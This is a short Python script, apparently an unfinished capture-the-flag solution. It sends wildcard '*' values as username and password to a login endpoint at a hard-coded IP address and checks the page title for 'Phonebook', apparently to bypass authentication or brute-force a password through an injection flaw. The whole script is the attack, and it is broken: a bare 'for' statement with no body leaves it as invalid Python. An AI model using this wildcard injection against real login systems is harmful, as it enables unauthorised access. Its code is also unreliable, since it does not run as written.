#!/usr/bin/env python3

import string
import requests
import re

url = 'http://138.68.182.108:32227/login'
check = 'Phonebook'

letters=list(string.printable)

for 

username = letters[0] + '*'
data = {
    'username': f'{username}',
    'password': '*'
}
resp = requests.post(url, data=data).text
title = re.search('<title>(.*)</title>', resp).group(1)

print(title)
